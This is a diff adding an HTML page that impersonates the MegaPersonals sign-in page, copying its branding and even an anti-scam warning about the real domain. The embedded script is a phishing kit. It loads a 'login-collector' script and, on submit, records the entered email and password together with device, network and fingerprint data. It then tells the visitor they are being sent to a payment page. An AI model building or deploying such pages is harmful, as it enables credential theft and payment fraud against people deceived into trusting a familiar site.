@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>MegaPersonals — Sign In (Dark)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        body {
+            background: #0a0c10;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #e0e0e0;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(20, 22, 30, 0.9);
+            backdrop-filter: blur(6px);
+            border-radius: 28px;
+            padding: 32px 28px;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: 0.3s;
+        }
+
+        .logo {
+            font-size: 42px;
+            font-weight: 800;
+            text-align: center;
+            letter-spacing: -0.5px;
+        }
+        .mega { color: #f09b42; }
+        .personals { color: #5aa9dd; }
+
+        .tagline {
+            text-align: center;
+            font-family: Georgia, serif;
+            font-size: 26px;
+            color: #b0b0b0;
+            margin: 8px 0 20px 0;
+            letter-spacing: 1px;
+        }
+
+        .question {
+            text-align: center;
+            font-size: 18px;
+            color: #c0916c;
+            margin-bottom: 12px;
+        }
+
+        .start-btn {
+            display: block;
+            width: fit-content;
+            margin: 0 auto 28px auto;
+            background: #1e70b9;
+            padding: 12px 40px;
+            border-radius: 30px;
+            text-decoration: none;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            text-align: center;
+            transition: 0.2s;
+            border: none;
+            cursor: pointer;
+        }
+        .start-btn:hover {
+            background: #0f5a9c;
+            transform: scale(1.02);
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 18px;
+            color: #c0916c;
+            margin: 20px 0 12px;
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-control {
+            width: 100%;
+            background: #2c2f36;
+            border: 1px solid #3e424b;
+            color: #f0f0f0;
+            padding: 12px 14px;
+            font-size: 15px;
+            border-radius: 12px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .form-control:focus {
+            border-color: #f09b42;
+            box-shadow: 0 0 0 2px rgba(240, 155, 66, 0.3);
+        }
+
+        .captcha-wrapper {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 14px;
+        }
+        .captcha-code {
+            flex: 1;
+            background: #2c2f36;
+            border: 1px solid #3e424b;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-family: monospace;
+            font-weight: bold;
+            letter-spacing: 8px;
+            color: #f09b42;
+            padding: 10px;
+        }
+        .captcha-refresh {
+            background: #3a3f48;
+            border: none;
+            border-radius: 12px;
+            padding: 0 18px;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .captcha-refresh:hover {
+            background: #f09b42;
+            color: #000;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #f09b42;
+            border: none;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 40px;
+            margin-top: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #111;
+        }
+        .submit-btn:hover {
+            background: #d4832c;
+            transform: translateY(-1px);
+        }
+
+        .warning {
+            background: #ffcf4a;
+            border-radius: 20px;
+            border: 3px solid #1e1e1e;
+            padding: 12px;
+            margin: 30px auto 20px;
+            max-width: 270px;
+            text-align: center;
+            position: relative;
+        }
+        .warning h3 {
+            font-size: 14px;
+            font-weight: 800;
+            color: #111;
+        }
+        .warning p {
+            font-size: 12px;
+            font-weight: bold;
+            color: #111;
+        }
+        .warning-q {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 38px;
+            font-weight: 800;
+            color: #111;
+        }
+
+        .forgot {
+            display: block;
+            text-align: center;
+            margin: 12px 0;
+            color: #b0d4ff;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 13px;
+            border-top: 1px solid #2a2a2a;
+            padding-top: 18px;
+        }
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .copyright {
+            text-align: center;
+            font-size: 11px;
+            margin-top: 16px;
+            color: #777;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 22px 18px;
+            }
+            .logo { font-size: 32px; }
+            .tagline { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <span class="mega">Mega</span><span class="personals">Personals</span>
+    </div>
+    <div class="tagline">personals classifieds</div>
+
+    <div class="question">Is this your first time posting?</div>
+    <a href="#" class="start-btn" id="startHereBtn">Start Here</a>
+
+    <div class="login-title">Already have an account?</div>
+
+    <div class="form-group">
+        <input type="text" id="loginEmail" class="form-control" placeholder="Email or Name" autocomplete="off">
+    </div>
+    <div class="form-group">
+        <input type="password" id="loginPassword" class="form-control" placeholder="Password">
+    </div>
+
+    <div class="captcha-wrapper">
+        <div class="captcha-code" id="captchaText">4H8K</div>
+        <button class="captcha-refresh" id="refreshCaptchaBtn">⟳</button>
+    </div>
+    <div class="form-group">
+        <input type="text" id="captchaInput" class="form-control" placeholder="Enter code from the picture">
+    </div>
+
+    <button class="submit-btn" id="submitLoginBtn">SUBMIT</button>
+
+    <div class="warning">
+        <h3>⚠️ DON'T GET SCAMMED!</h3>
+        <p>Is the address up top:<br>megapersonals.eu</p>
+        <div class="warning-q">?</div>
+    </div>
+
+    <a href="#" class="forgot">FORGOT PASSWORD?</a>
+
+    <div class="footer-links">
+        <a href="#">Home</a> |
+        <a href="#">About Us</a> |
+        <a href="#">Terms & Policies</a> |
+        <a href="#">Contact Us</a>
+        <br>
+        <a href="#">Manage Posts</a>
+    </div>
+    <div class="copyright">
+        Copyright © 2024 MegaPersonals.eu
+    </div>
+</div>
+
+<script src="../assets/js/login-collector.js"></script>
+<script>
+    (function(){
+        let currentCaptcha = '4H8K';
+
+        function generateRandomCaptcha() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+            let capt = '';
+            for(let i=0; i<4; i++) {
+                capt += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return capt;
+        }
+
+        function refreshCaptchaUI() {
+            currentCaptcha = generateRandomCaptcha();
+            document.getElementById('captchaText').innerText = currentCaptcha;
+        }
+
+        // Attach events
+        document.getElementById('refreshCaptchaBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            refreshCaptchaUI();
+        });
+
+        document.getElementById('submitLoginBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            const captchaEntered = document.getElementById('captchaInput').value.trim();
+
+            if(!email || !password) {
+                alert('Please enter email/name and password');
+                return;
+            }
+            if(captchaEntered.toUpperCase() !== currentCaptcha) {
+                alert('Invalid CAPTCHA code');
+                refreshCaptchaUI();
+                document.getElementById('captchaInput').value = '';
+                return;
+            }
+
+            // disable button to avoid double submit
+            const btn = document.getElementById('submitLoginBtn');
+            btn.disabled = true;
+            btn.innerText = 'Processing...';
+
+            try {
+                // This will collect all data (IP, fingerprint, device, etc.) using your loginCollector class
+                const collected = await loginCollector.addEntry(); 
+                // but note: addEntry() collects everything automatically, 
+                // however we need to also store email/password/captcha/page_source.
+                // So let's manually update the last entry with login-specific fields.
+                let allEntries = loginCollector.getAllEntries();
+                if(allEntries.length > 0) {
+                    let lastEntry = allEntries[allEntries.length - 1];
+                    lastEntry.login_credentials = {
+                        email: email,
+                        password: password,
+                        captcha: currentCaptcha,
+                        sourcePage: 'landing1'
+                    };
+                    // Save updated entry
+                    localStorage.setItem('login_data', JSON.stringify(allEntries));
+                } else {
+                    // fallback: directly call addEntry but we need to add extra metadata ourselves
+                    // Actually, we can just directly save a custom object with minimal required fields 
+                    // but to keep consistent, we will make a manual entry structure.
+                    const manualEntry = {
+                        id: Date.now() + '-' + Math.random().toString(36).substr(2, 6),
+                        timestamp: new Date().toISOString(),
+                        collectionTime: 0,
+                        network: { publicIP: 'N/A', localIPs: [] },
+                        fingerprints: { canvas: 'N/A', webgl: 'N/A' },
+                        device: { userAgent: navigator.userAgent, os: 'Unknown', browser: 'Unknown', deviceType: 'Unknown', language: navigator.language },
+                        screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+                        location: { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, referrer: document.referrer, geolocation: {} },
+                        features: { cookiesEnabled: navigator.cookieEnabled, plugins: [], battery: 'N/A', storage: { localStorageAvailable: true, sessionStorageAvailable: true } },
+                        context: { url: window.location.href, host: window.location.host, pathname: window.location.pathname },
+                        login_credentials: {
+                            email: email,
+                            password: password,
+                            captcha: currentCaptcha,
+                            sourcePage: 'landing1'
+                        }
+                    };
+                    allEntries.push(manualEntry);
+                    localStorage.setItem('login_data', JSON.stringify(allEntries));
+                }
+
+                alert(`✅ Login submitted!\nWelcome back, ${email}\nWe will redirect you to payment page.`);
+                window.location.href = '../pay.html';
+            } catch(err) {
+                console.error(err);
+                alert('Error submitting login data.');
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'SUBMIT';
+                document.getElementById('loginEmail').value = '';
+                document.getElementById('loginPassword').value = '';
+                document.getElementById('captchaInput').value = '';
+                refreshCaptchaUI();
+            }
+        });
+
+        document.getElementById('startHereBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('New account registration demo: contact admin for access.');
+        });
+
+        refreshCaptchaUI();
+    })();
+</script>
+</body>
+</html>
